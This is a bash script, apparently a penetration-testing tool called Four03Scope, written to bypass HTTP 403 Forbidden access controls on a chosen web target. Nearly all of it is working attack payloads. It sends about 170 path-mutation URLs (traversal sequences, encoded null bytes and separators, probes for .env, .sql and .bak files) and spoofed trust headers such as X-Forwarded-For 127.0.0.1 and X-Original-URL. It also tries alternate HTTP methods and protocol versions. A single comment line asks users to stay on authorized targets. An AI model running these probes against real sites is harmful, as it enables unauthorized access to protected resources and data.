#!/bin/bash

# Four03Scope - HTTP 403 bypass & behavior mapping helper
# Author: nazmul__ethi (enhanced & refactored)
# Description:
#   Four03Scope mutates paths, headers, HTTP methods and protocol versions
#   to help you find ways around 403 Forbidden and understand access control behavior.
#
# NOTE: Use only on targets you are authorized to test.

# =========================
# Color definitions
# =========================
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RESET='\033[0m'
VIOLET='\033[38;2;138;43;226m'
ORANGE='\033[38;2;255;165;0m'
INDIGO='\033[38;2;75;0;130m'

# =========================
# Settings
# =========================

# User-Agent to use for all requests
USER_AGENT="Four03Scope/1.0 (https://github.com/yourname/Four03Scope)"

# Optional delay (seconds) between requests (0 = no delay)
REQUEST_DELAY=0

# Optional output file (set via env or edit here). Example:
#   export FOUR03SCOPE_OUT=results.txt
OUTPUT_FILE="${FOUR03SCOPE_OUT:-}"

# =========================
# Dependencies check
# =========================

if ! command -v curl >/dev/null 2>&1; then
    echo -e "${RED}[!] curl is required but not installed.${RESET}"
    exit 1
fi

HAS_FIGLET=false
if command -v figlet >/dev/null 2>&1; then
    HAS_FIGLET=true
fi

HAS_JQ=false
if command -v jq >/dev/null 2>&1; then
    HAS_JQ=true
fi

# =========================
# Usage / help
# =========================

usage() {
    echo -e "${ORANGE}Four03Scope - HTTP 403 Bypass & Mapping Toolkit${RESET}"
    echo
    echo -e "${WHITE}Usage:${RESET}  ./four03scope.sh <base_url> <path>"
    echo
    echo -e "${WHITE}Examples:${RESET}"
    echo -e "  ./four03scope.sh https://example.com admin"
    echo -e "  ./four03scope.sh https://example.com admin/index.php"
    echo -e "  ./four03scope.sh https://example.com server-status"
    echo
    echo -e "${CYAN}Options:${RESET}"
    echo -e "  -h, --help      Show this help menu"
    echo
    echo -e "This tool mutates paths, headers, HTTP methods and protocol versions"
    echo -e "to help detect 403 bypass scenarios and other interesting behavior."
}

if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    usage
    exit 0
fi

# =========================
# Arg validation
# =========================

BASE_URL="$1"
TARGET_PATH="$2"

if [[ -z "$BASE_URL" || -z "$TARGET_PATH" ]]; then
    echo -e "${RED}[!] Missing arguments.${RESET}"
    usage
    exit 1
fi

# Normalize target URL a bit
BASE_URL="${BASE_URL%/}"
TARGET_PATH="${TARGET_PATH#/}"
TARGET="${BASE_URL}/${TARGET_PATH}"

# =========================
# Banner
# =========================

echo
if $HAS_FIGLET; then
    echo -e "${ORANGE}"
    figlet -f slant Four03Scope
    echo -e "${RESET}"
else
    echo -e "${ORANGE}==== Four03Scope ====${RESET}"
fi

echo -e "${ORANGE}Target: ${WHITE}${TARGET}${RESET}"
echo -e "By ${CYAN}nazmul__ethi${RESET}"
echo

# =========================
# Helpers
# =========================

log_line() {
    # Also log to file if configured
    local line="$1"
    echo -e "$line"
    if [[ -n "$OUTPUT_FILE" ]]; then
        # strip ANSI colors for file
        echo -e "$line" | sed 's/\x1b\[[0-9;]*m//g' >> "$OUTPUT_FILE"
    fi
}

colorize_status_code() {
    local http_code="$1"
    if [[ "$http_code" == "200" || "$http_code" == "201" || "$http_code" == "204" ]]; then
        echo -e "${GREEN}${http_code}${RESET}"
    elif [[ "$http_code" == "403" ]]; then
        echo -e "${RED}${http_code}${RESET}"
    elif [[ "$http_code" == "404" ]]; then
        echo -e "${RED}${http_code}${RESET}"
    elif [[ "$http_code" == "405" ]]; then
        echo -e "${YELLOW}${http_code}${RESET}"
    elif [[ "$http_code" == "500" || "$http_code" == "502" || "$http_code" == "503" ]]; then
        echo -e "${VIOLET}${http_code}${RESET}"
    else
        echo -e "${YELLOW}${http_code}${RESET}"
    fi
}

# Shared curl command (no URL at the end)
curl_base=(
    curl -k -s -o /dev/null -iL
    -A "$USER_AGENT"
    -w "%{http_code},%{size_download}"
)

run_request() {
    # $1 = URL
    # other args: extra curl flags
    local url="$1"; shift
    "${curl_base[@]}" "$@" "$url"
}

sleep_if_needed() {
    if [[ "$REQUEST_DELAY" -gt 0 ]]; then
        sleep "$REQUEST_DELAY"
    fi
}

# =========================
# Baseline probe
# =========================

BASELINE_RESPONSE="$(run_request "$TARGET")"
BASELINE_CODE="$(echo "$BASELINE_RESPONSE" | cut -d',' -f1)"
BASELINE_SIZE="$(echo "$BASELINE_RESPONSE" | cut -d',' -f2)"

BASE_COLORIZED="$(colorize_status_code "$BASELINE_CODE")"
log_line "${BLUE}[BASELINE]${RESET} ${TARGET}  => Status: [${BASE_COLORIZED}]  Size: ${BASELINE_SIZE}"
sleep_if_needed

# Mark interesting responses (different from baseline)
is_interesting() {
    local code="$1"
    local size="$2"
    if [[ "$code" != "$BASELINE_CODE" || "$size" != "$BASELINE_SIZE" ]]; then
        return 0
    fi
    return 1
}

# =========================
# PATH MUTATION SCAN
# =========================

echo
log_line "${VIOLET}=== PATH MUTATION SCAN ===${RESET}"
echo

fuzz_paths=(
    "$BASE_URL/$TARGET_PATH/../"
    "$BASE_URL/$TARGET_PATH/.."
    "$BASE_URL/../$TARGET_PATH"
    "$BASE_URL/../$TARGET_PATH/../"
    "$BASE_URL//$TARGET_PATH//"
    "$BASE_URL//$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH//"
    "$BASE_URL/./$TARGET_PATH"
    "$BASE_URL/./$TARGET_PATH/./"
    "$BASE_URL/.$TARGET_PATH"
    "$BASE_URL/./$TARGET_PATH/."
    "$BASE_URL/$TARGET_PATH/../../"
    "$BASE_URL/../../$TARGET_PATH/../../"
    "$BASE_URL/../../$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/../../../"
    "$BASE_URL/../../../$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/../../..//"
    "$BASE_URL/../../..//$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/../..//"
    "$BASE_URL/../..//$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/../..//../"
    "$BASE_URL/../..//../$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/../..;/"
    "$BASE_URL/../..;/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/.././../"
    "$BASE_URL/.././../$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/../.;/../"
    "$BASE_URL/../.;/../$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/..//../"
    "$BASE_URL/..//../$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/..//..;/"
    "$BASE_URL/..//..;/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/..;//..;/"
    "$BASE_URL/..;//..;/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH//.."
    "$BASE_URL/$TARGET_PATH//../../"
    "$BASE_URL/$TARGET_PATH//..;"
    "$BASE_URL/$TARGET_PATH/%00"
    "$BASE_URL/$TARGET_PATH%00"
    "$BASE_URL/%00/$TARGET_PATH"
    "$BASE_URL/%00/$TARGET_PATH/%00"
    "$BASE_URL/$TARGET_PATH/..%00/;"
    "$BASE_URL/..%00/;$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/..%00;/"
    "$BASE_URL/$TARGET_PATH/..;%00/"
    "$BASE_URL%00$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/%09"
    "$BASE_URL/$TARGET_PATH%09"
    "$BASE_URL/%09/$TARGET_PATH"
    "$BASE_URL/%09/$TARGET_PATH/%09/"
    "$BASE_URL/$TARGET_PATH/%09.."
    "$BASE_URL/$TARGET_PATH/..%09"
    "$BASE_URL%09$TARGET_PATH"
    "$BASE_URL/..%09/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH%09%3b"
    "$BASE_URL/%09%3b/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH%09%3b"
    "$BASE_URL/$TARGET_PATH/%0d"
    "$BASE_URL/$TARGET_PATH%0d"
    "$BASE_URL/%0d/$TARGET_PATH"
    "$BASE_URL/%0d/$TARGET_PATH/%0d"
    "$BASE_URL/$TARGET_PATH..%0d/;"
    "$BASE_URL/..%0d/;/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/..%0d;/"
    "$BASE_URL/$TARGET_PATH/..;%0d/"
    "$BASE_URL%0d$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/%20"
    "$BASE_URL/$TARGET_PATH%20"
    "$BASE_URL/%20/$TARGET_PATH"
    "$BASE_URL/%20/$TARGET_PATH/%20"
    "$BASE_URL/$TARGET_PATH/%20#"
    "$BASE_URL/$TARGET_PATH/%20%23"
    "$BASE_URL/$TARGET_PATH/%23"
    "$BASE_URL/$TARGET_PATH%23"
    "$BASE_URL/%23/$TARGET_PATH"
    "$BASE_URL/%23/$TARGET_PATH/%23/"
    "$BASE_URL/$TARGET_PATH/%23%3f"
    "$BASE_URL/$TARGET_PATH%23%3f"
    "$BASE_URL/%23%3f/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH%252e**"
    "$BASE_URL%20$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH%252e/"
    "$BASE_URL/$TARGET_PATH/%252e%252e%252f/"
    "$BASE_URL/$TARGET_PATH/%252e%252e%253b/"
    "$BASE_URL/%252e%252e%253b/$TARGET_PATH/%252e%252e%253b/"
    "$BASE_URL/$TARGET_PATH%252f/"
    "$BASE_URL/$TARGET_PATH/%252f"
    "$BASE_URL/$TARGET_PATH%252f%252f"
    "$BASE_URL/%252f%252f/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/%2e/"
    "$BASE_URL/$TARGET_PATH%2f%2e%2e"
    "$BASE_URL/%2e/$TARGET_PATH"
    "$BASE_URL/%2e/$TARGET_PATH/%2e"
    "$BASE_URL/$TARGET_PATH%2e%2e"
    "$BASE_URL/$TARGET_PATH;/"
    "$BASE_URL/$TARGET_PATH%2e%2e%2f"
    "$BASE_URL/%2e%2e/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/%2e//"
    "$BASE_URL/%2e//$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/%2e%2e/"
    "$BASE_URL/%2e%2e%3b/$TARGET_PATH%2e%2e%3b"
    "$BASE_URL/$TARGET_PATH/%2e%2f/"
    "$BASE_URL/%2e%2f/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH%2f"
    "$BASE_URL/$TARGET_PATH/%2f"
    "$BASE_URL/%2f/$TARGET_PATH"
    "$BASE_URL/%2f/$TARGET_PATH/%2f/"
    "$BASE_URL/$TARGET_PATH/..%2f"
    "$BASE_URL/..%2f/$TARGET_PATH"
    "$BASE_URL/..%2f/$TARGET_PATH/..%2f/"
    "$BASE_URL/$TARGET_PATH/..;%2f"
    "$BASE_URL/$TARGET_PATH%2f%23"
    "$BASE_URL/$TARGET_PATH/%2f%23"
    "$BASE_URL/%2f%23/$TARGET_PATH"
    "$BASE_URL/%2f../$TARGET_PATH"
    "$BASE_URL/%2f../$TARGET_PATH/%2f../"
    "$BASE_URL/$TARGET_PATH%2f.."
    "$BASE_URL%2e$TARGET_PATH"
    "$BASE_URL%2F$TARGET_PATH"
    "$BASE_URL/..%2f..%2f/$TARGET_PATH"
    "$BASE_URL/..%2f..%2f/$TARGET_PATH/..%2f..%2f/"
    "$BASE_URL/$TARGET_PATH/..%2f..%2f"
    "$BASE_URL/$TARGET_PATH/..;%2f..;%2f"
    "$BASE_URL/$TARGET_PATH/..%2f..%2f..%2f"
    "$BASE_URL/..%2f..%2f..%2f/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/..;%2f..;%2f..;%2f"
    "$BASE_URL/$TARGET_PATH%3b"
    "$BASE_URL/%3b/$TARGET_PATH"
    "$BASE_URL/%3b/$TARGET_PATH/%3b/"
    "$BASE_URL/$TARGET_PATH/%3b"
    "$BASE_URL%3b$TARGET_PATH"
    "$BASE_URL/%3b/../$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/%3b/.."
    "$BASE_URL/$TARGET_PATH%3b%09"
    "$BASE_URL/%3b/%2e./$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH%3b/%2e."
    "$BASE_URL/$TARGET_PATH/%3b/%2e."
    "$BASE_URL/$TARGET_PATH%3b//%2f../"
    "$BASE_URL/%3b//%2f../$TARGET_PATH%3b//%2f../"
    "$BASE_URL/$TARGET_PATH%3b/%2f%2f../"
    "$BASE_URL/$TARGET_PATH%ef%bc%8f"
    "$BASE_URL/$TARGET_PATH/%3f%23"
    "$BASE_URL/%3f%23/$TARGET_PATH/%3f%23"
    "$BASE_URL%23$TARGET_PATH"
    "$BASE_URL/..%5c/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH/..%5c/"
    "$BASE_URL/$TARGET_PATH/..%ff/;"
    "$BASE_URL/..%ff/;/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH%ff"
    "$BASE_URL/*/$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH#"
    "$BASE_URL/#$TARGET_PATH"
    "$BASE_URL/$TARGET_PATH.asp"
    "$BASE_URL/$TARGET_PATH.aspx"
    "$BASE_URL/$TARGET_PATH.bak"
    "$BASE_URL/$TARGET_PATH.config"
    "$BASE_URL/$TARGET_PATH.db"
    "$BASE_URL/$TARGET_PATH.env"
    "$BASE_URL/$TARGET_PATH.html"
    "$BASE_URL/$TARGET_PATH.json"
    "$BASE_URL/$TARGET_PATH.jsp"
    "$BASE_URL/$TARGET_PATH.php"
    "$BASE_URL/$TARGET_PATH.sql"
    "$BASE_URL/$TARGET_PATH.txt"
    "$BASE_URL/$TARGET_PATH.zip"
    "$BASE_URL/$TARGET_PATH.xml"
    "$BASE_URL/$TARGET_PATH.log"
    "$BASE_URL/$TARGET_PATH.old"
)

for path in "${fuzz_paths[@]}"; do
    response="$(run_request "$path")"
    http_code="$(echo "$response" | cut -d',' -f1)"
    size="$(echo "$response" | cut -d',' -f2)"
    colorized_code="$(colorize_status_code "$http_code")"

    marker=""
    if is_interesting "$http_code" "$size"; then
        marker=" ${GREEN}[! interesting]${RESET}"
    fi

    log_line "  --> ${path}  Response: [${colorized_code}] Size: ${size}${marker}"
    sleep_if_needed
done

# =========================
# TRUST HEADER SPOOFING
# =========================

echo
log_line "${VIOLET}=== TRUST HEADER SPOOFING ===${RESET}"
echo

fuzz_headers=(
    "X-Forwarded-For: localhost"
    "X-Forwarded-For: localhost:80"
    "X-Forwarded-For: localhost:443"
    "X-Forwarded-For: 127.0.0.1"
    "X-Forwarded-For: 127.0.0.1:80"
    "X-Forwarded-For: 127.0.0.1:443"
    "X-Forwarded-For: 2130706433"
    "X-Forwarded-For: 0x7F000001"
    "X-Forwarded-For: 0177.0000.0000.0001"
    "X-Forwarded-For: 0"
    "X-Forwarded-For: 127.1"
    "X-Forwarded-For: 10.0.0.1"
    "X-Forwarded-For: 172.16.0.1"
    "X-Forwarded-For: 192.168.1.1"
    "X-Forwarded-Port: 80"
    "X-Forwarded-Port: 443"
    "X-Forwarded-Port: 8080"
    "X-Forwarded-Port: 8443"
    "X-Forwarded: 127.0.0.1"
    "X-Forwarded: localhost"
    "Host: localhost"
    "X-Host: localhost"
    "X-Host: 127.0.0.1"
    "X-ProxyUser-Ip: 127.0.0.1"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Custom-IP-Authorization: localhost"
    "X-Remote-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Remote-Addr: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Original-URL: /${TARGET_PATH}"
    "X-Rewrite-URL: /${TARGET_PATH}"
    "X-Original-URL: /admin/"
    "X-Rewrite-URL: /admin/"
)

for header in "${fuzz_headers[@]}"; do
    response="$(run_request "$TARGET" -H "$header")"
    http_code="$(echo "$response" | cut -d',' -f1)"
    size="$(echo "$response" | cut -d',' -f2)"
    colorized_code="$(colorize_status_code "$http_code")"

    marker=""
    if is_interesting "$http_code" "$size"; then
        marker=" ${GREEN}[! interesting]${RESET}"
    fi

    log_line "  --> ${TARGET}  Header: \"$header\"  Response: [${colorized_code}] Size: ${size}${marker}"
    sleep_if_needed
done

# =========================
# METHOD SURFACE PROBE
# =========================

echo
log_line "${VIOLET}=== METHOD SURFACE PROBE ===${RESET}"
echo

methods=("PUT" "POST" "CONNECT" "TRACE" "PATCH" "HEAD")

for method in "${methods[@]}"; do
    response="$(run_request "$TARGET" -X "$method")"
    http_code="$(echo "$response" | cut -d',' -f1)"
    size="$(echo "$response" | cut -d',' -f2)"
    colorized_code="$(colorize_status_code "$http_code")"

    marker=""
    if is_interesting "$http_code" "$size"; then
        marker=" ${GREEN}[! interesting]${RESET}"
    fi

    log_line "  --> ${TARGET}  -X $method  Response: [${colorized_code}] Size: ${size}${marker}"
    sleep_if_needed
done

# =========================
# PROTOCOL NEGOTIATION TESTS
# =========================

echo
log_line "${VIOLET}=== PROTOCOL NEGOTIATION TESTS ===${RESET}"
echo

versions=("0.9" "1.0" "1.1" "2")

for version in "${versions[@]}"; do
    extra_flags=()
    if [[ "$version" == "2" ]]; then
        extra_flags+=(--http2)
        label="2"
    else
        extra_flags+=(--http"$version")
        label="$version"
    fi

    response="$(run_request "$TARGET" "${extra_flags[@]}")"
    http_code="$(echo "$response" | cut -d',' -f1)"
    size="$(echo "$response" | cut -d',' -f2)"
    colorized_code="$(colorize_status_code "$http_code")"

    marker=""
    if is_interesting "$http_code" "$size"; then
        marker=" ${GREEN}[! interesting]${RESET}"
    fi

    log_line "  --> ${TARGET}  HTTP/${label}  Response: [${colorized_code}] Size: ${size}${marker}"
    sleep_if_needed
done

# =========================
# ARCHIVE RECON (Wayback)
# =========================

echo
log_line "${VIOLET}=== ARCHIVE RECON (Wayback Machine) ===${RESET}"
echo

WAYBACK_URL="https://archive.org/wayback/available?url=${TARGET}"

if $HAS_JQ; then
    wb="$(curl -s "$WAYBACK_URL" | jq -r '.archived_snapshots.closest // empty')"
    if [[ -n "$wb" && "$wb" != "null" ]]; then
        available=$(echo "$wb" | jq -r '.available')
        snapshot_url=$(echo "$wb" | jq -r '.url')
        status=$(echo "$wb" | jq -r '.status')
        if [[ "$available" == "true" ]]; then
            log_line "  -> Snapshot available: ${snapshot_url} (status: ${status})"
        else
            log_line "  -> No Wayback snapshot marked as available for this URL."
        fi
    else
        log_line "  -> No Wayback snapshot information returned."
    fi
else
    log_line "  -> jq not installed; raw Wayback response:"
    log_line "$(curl -s "$WAYBACK_URL")"
fi

echo
log_line "${GREEN}[Done] Four03Scope run complete.${RESET}"
echo
